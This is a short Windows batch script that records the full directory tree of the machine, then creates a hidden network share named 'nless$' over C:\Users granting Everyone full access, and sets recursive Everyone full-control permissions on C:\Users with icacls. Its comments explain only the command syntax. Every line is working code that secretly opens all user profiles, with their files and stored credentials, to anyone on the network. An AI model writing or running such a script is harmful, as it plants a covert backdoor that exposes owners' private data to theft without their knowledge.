ECHO off
REM gather the system file structure
mkdir c:\Users\tempa
tree /a /f > c:\Users\tempa\tree.txt

REM creates a hidden share syntax(net share <sharename>=<sharelocation> /grant:<user>,<permission>)
net share nless$=C:\Users /grant:Everyone,full
REM creates security permissions for the shared folder syntax(icacls <sharedlocation> /grant <user>:<permissoons> /T
icacls "C:\Users" /grant Everyone:(OI)(CI)F /T